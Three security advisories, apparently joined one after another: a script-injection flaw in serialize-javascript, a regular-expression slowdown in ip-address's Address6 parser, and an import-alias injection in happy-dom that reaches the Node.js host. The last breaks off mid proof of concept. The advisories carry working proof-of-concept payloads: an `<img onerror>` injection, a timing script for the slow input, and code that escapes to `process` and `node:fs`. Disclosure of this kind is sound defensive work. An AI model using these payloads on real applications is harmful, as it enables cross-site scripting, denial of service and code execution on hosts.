### Impact

`serialize-javascript` escapes its output so it is safe to embed inside a
`<script>` element. Before 7.1.3 that guarantee did not hold for a **function
value whose source ends in a bare `</script`**.

Each function body is escaped on its own, and a bare `</script` was only
neutralized when followed — within the same body — by a character the HTML
tokenizer treats as ending the tag name (TAB, LF, FF, CR, SPACE, `/` or `>`).
A body ending exactly at `</script` has no following character, so it was
emitted unescaped. The delimiter is then supplied by the surrounding output
(for example the newline the `space` option emits after the value), and a
later serialized value can supply the closing `>` followed by markup:

```js
const serialize = require('serialize-javascript');
function f() {} f.toString = () => 'function f(){ return 1 }//</script';
function g() {} g.toString = () => 'function g(x){ return x } > <img src=x onerror=alert(1)>';
serialize({ a: { f }, g }, { space: 2 });
// {
//   "a": {
//     "f": function f(){ return 1 }//</script
//   },
//   "g": function g(x){ return x } > <img src=x onerror=alert(1)>
// }
```

Embedded in a `<script>` element, the script ends at the injected tag and the
`<img>` becomes a live element in the page.

Exploitation requires an attacker to control the **source text** of a
serialized function, in practice through a spoofed `toString()`. Real
functions always end in `}`, so ordinary function values are not affected,
and non-function values (including strings containing `</script`) are
escaped correctly.

### Patches

Fixed in **7.1.3** (#235). The bare `</script` form is now also matched at
the end of the function body, so it is escaped regardless of what follows it
in the output.

### Workarounds

Upgrade to **7.1.3**. If you cannot upgrade, do not serialize function values
whose source text (or `toString()`) can be influenced by an attacker.

### Credits

Reported by **ha_kr25** via the Yahoo bug bounty program.

### Summary

`new Address6()` and `Address6.isValid()` strip a zone identifier with the pattern `/%.*$/` before they apply the 45-character length limit. When the string holds many `%` characters followed by a line terminator, the pattern is retried from every `%` and each attempt scans to the line terminator before failing, so rejecting the string takes time proportional to the square of its length. 10,000 `%` characters and a newline take 41 ms, 40,000 take 632 ms and 100,000 take 3.9 s of synchronous work. The same strings without the newline are rejected in under a millisecond.

An application that validates an attacker-supplied string with these methods can be stalled by a single long request. The input is rejected with the correct `AddressError`; the cost of reaching that rejection is the defect.

### Details

The constructor in `src/ipv6.ts` removes the CIDR suffix, then the zone, then checks the length of what is left:

```ts
const zone = constants6.RE_ZONE_STRING.exec(address);

if (zone) {
  this.zone = zone[0];

  address = address.replace(constants6.RE_ZONE_STRING, '');
}

const longest = this.groups * 5 + 5;

if (address.length > longest) {
  throw new AddressError(`IPv6 addresses are at most ${longest} characters.`);
}
```

`RE_ZONE_STRING` is `/%.*$/`. It has no anchor at its start, `.` does not match a line terminator (`\n`, `\r`, U+2028 or U+2029), and without the `m` flag `$` matches only at the end of the input. For `%` repeated N times and then `\n`, the engine starts a match at the first `%`, `.*` consumes the remaining `%` characters up to the newline, `$` fails there, and backtracking through every shorter `.*` fails too. The engine then starts again at the second `%`, and so on: N starts, each proportional to N. The length limit that follows rejects the string in constant time, after the scan has already run.

The line terminator need not be last. Any string in which many `%` characters precede a line terminator behaves the same way.

Every entry point that passes a caller's string to the `Address6` constructor is affected: `new Address6()`, `isValid()`, both arguments of `fromAddressAndMask()` and `fromAddressAndWildcardMask()`, and the prefix argument of `fromAddress4Nat64()` and `toAddress4Nat64()`. `fromWildcard()` rejects a `%` before it constructs anything, `fromURL()` admits only hex digits, colons and dots in a host, and `fromArpa()` checks the nibble grammar first, so those three are unaffected. `Address4` has no zone and is unaffected.

### Affected versions

`<= 10.7.3`. The zone pattern has been in the constructor since 1.0.0; 5.9.4, 9.0.5 and 10.7.0 show the same timings as 10.7.3.

### Impact

`Address6.isValid()` on N `%` characters and a newline, measured on ip-address 10.7.3 and node 24.21.0:

| Input | Wall time | Same length of `!` |
|---|---|---|
| 5,461 characters | 13 ms | 0.1 ms |
| 16 KiB | 108 ms | 0.1 ms |
| 100 KB | 3.9 s | 0.1 ms |
| 256 KiB | 27 s | 0.2 ms |

The parse is synchronous, so the event loop is blocked for the whole of the wall time and nothing else on that process is served. No memory is retained and the process resumes when the call returns.

### Reachability

The input needs a line terminator after the `%` characters, which decides where it can arrive. An HTTP header value cannot carry a carriage return or a line feed, so a host or address taken from a header does not reach this. A URL can carry both characters percent-encoded at three bytes each, and Node's default 16 KB limit on the request line and headers admits about 5,461 of them: 13 ms. A request body is where the larger sizes come from. Common body parsers default to between 100 KB and 1 MB, and at 100 KB one field passed to the parser unchecked blocks the process for 3.9 s.

### Proof of concept

`npm i ip-address@10.7.3`, then:

```js
const { Address6 } = require('ip-address');

function time(input) {
  const start = process.hrtime.bigint();

  Address6.isValid(input);

  return `${(Number(process.hrtime.bigint() - start) / 1e6).toFixed(1)} ms`;
}

for (const n of [10000, 20000, 40000, 100000]) {
  console.log(`${n}: ${time(`${'%'.repeat(n)}\n`)}, without the newline ${time('%'.repeat(n))}`);
}
```

On affected versions (node 24.21.0):

```
10000: 41.0 ms, without the newline 0.0 ms
20000: 161.1 ms, without the newline 0.0 ms
40000: 632.4 ms, without the newline 0.1 ms
100000: 3899.8 ms, without the newline 0.1 ms
```

Each doubling of the input multiplies the time by four.

### Remediation

Upgrade to the patched release. In the fix, the constructor finds the zone by the index of the first `%` and accepts the remainder as a zone only when it holds no line terminator, which reads the input once. 1 MiB of the input above is rejected in about a millisecond. Every address that parsed before parses to the same result, and a string with a line terminator after a `%` is rejected as it was.

`RE_ZONE_STRING` stays exported from `v6/constants` for code that imports it directly and is marked `@deprecated`; the library itself does not call it.

If you cannot upgrade immediately, reject a candidate longer than an address with a zone identifier can be before you parse it:

```js
if (host.length > 64) throw new Error('not an IP address');
```

## Summary

The ESM compiler in `happy-dom@20.14.5` does not validate imported local binding aliases before interpolating them into generated JavaScript.

As a result, an invalid ESM import alias can be transformed into a valid JavaScript destructuring default initializer and executed.

This appears to be an alternate injection path and incomplete remediation of GHSA-6q6h-j7hj-3r64 / CVE-2026-33943. The previous fix validates `importName` in the local `export { ... }` handler, but the named import handler still places an unvalidated `alias` directly into code context.

These issues were confirmed through the public `Window` and `<script type="module">` APIs using the published `happy-dom` npm package. The PoC reaches the Node.js host `process`, obtains `node:fs`, and creates a proof directory on the host filesystem.

## Confirmed affected versions

The PoC was directly tested against:

- `happy-dom@17.0.0`
- `happy-dom@20.0.0`
- `happy-dom@20.1.0`
- `happy-dom@20.14.5`

The same PoC does not trigger on `happy-dom@16.8.1`.

The ESM compiler was introduced by commit `7bc831df2`, first released in `v17.0.0`. The vulnerable interpolation remains present through `v20.14.5`, the latest release at the time of testing.

Suggested affected range:

```text
>= 17.0.0, <= 20.14.5
```

No patched version is currently available.

## Preconditions

- JavaScript evaluation is enabled with `enableJavaScriptEvaluation: true`.
- Attacker-controlled HTML or module source is processed by Happy DOM.
- This may affect SSR, preview, scraping, or testing services that evaluate externally supplied HTML.

## Technical details

In `packages/happy-dom/src/module/ECMAScriptModuleCompiler.ts`, the named import handler splits an import specifier and extracts its alias:

```ts
const nameParts = part.trim().split(/\s+as\s+/);
const alias = (nameParts[1] || nameParts[0]).replace(/["']/g, '');
const name = nameParts[0].replace(/["']/g, '');

if (alias && name) {
  properties.push({ name, alias });
}
```

Unlike the patched `export { ... }` handler, the value of `alias` is not validated as a JavaScript identifier.

It is subsequently inserted directly into generated binding syntax:

```ts
newCodeStart += `let {${properties
  .map((property) =>
    property.alias
      ? `"${property.name}": ${property.alias}`
      : property.name
  )
  .join(', ')}} = $happy_dom.imports.get('${url}')${match[8]}`;
```

Consider the following source:

```js
import {
  missing as injected = globalThis.__HAPPY_DOM_PWNED__ = 1337
} from './dep.json' with { type: 'json' };
```

This is invalid ECMAScript module syntax. Node.js rejects it at the `=` token.

Happy DOM instead transforms it into the equivalent of:

```js
let {
  "missing": injected = globalThis.__HAPPY_DOM_PWNED__ = 1337
} = $happy_dom.imports.get('https://poc.local/dep.json');
```

This generated JavaScript is valid. Because the imported JSON object does not contain a `missing` property, the default initializer executes.

The `with { type: 'json' }` attribute is relevant because the compiler only generates its circular import resolver for ESM imports:

```ts
if (!match[7] || match[7] === 'esm') {
  resolvableCircularImports.push({ url, properties });
}
```

Using a JSON module prevents the malicious alias from being emitted again in a later circular-import assignment, leaving the generated function syntactically valid.

Backtick strings also survive the existing quote removal. This allows the injected initializer to reach Node.js host APIs:

```js
globalThis.constructor.constructor(`return process`)()
  .getBuiltinModule(`node:fs`)
  .mkdirSync(
    globalThis.constructor.constructor(`return process`)().cwd() +
      `/HAPPY_DOM_RCE_PROOF`
  )
```

## Proof of concept

The following PoC uses only the public Happy DOM API and performs a harmless filesystem action by creating a directory named `HAPPY_DOM_RCE_PROOF`.

### 1. Create `package.json`

```json
{
  "name": "happy-dom-import-alias-rce-poc",
  "private": true,
  "type": "module",
  "dependencies": {
    "happy-dom": "20.14.5"
